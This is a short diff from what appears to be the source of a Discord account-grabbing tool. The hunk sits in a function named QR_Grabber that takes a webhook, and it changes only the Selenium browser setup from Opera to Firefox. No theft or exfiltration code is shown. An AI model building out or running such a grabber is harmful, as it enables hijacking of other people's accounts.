@@ -62,11 +62,12 @@ def QR_Grabber(Webhook):
             input()
             Hazard.main()
     elif type_ == "geckodriver":
-        opts = webdriver.opera.options.ChromeOptions()
-        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
-        opts.add_experimental_option("detach", True)
+        cwd=os.getcwd()
+        #opts=webdriver.FirefoxOptions()
+        #opts.add_experimental_option('excludeSwitches', ['enable-logging'])
+        #opts.add_experimental_option("detach", True)
         try:
-            driver = webdriver.Opera(options=opts)
+            driver = webdriver.Firefox(executable_path=cwd+"/geckodriver")
         except common.exceptions.SessionNotCreatedException as e:
             print(e.msg)
             sleep(2)
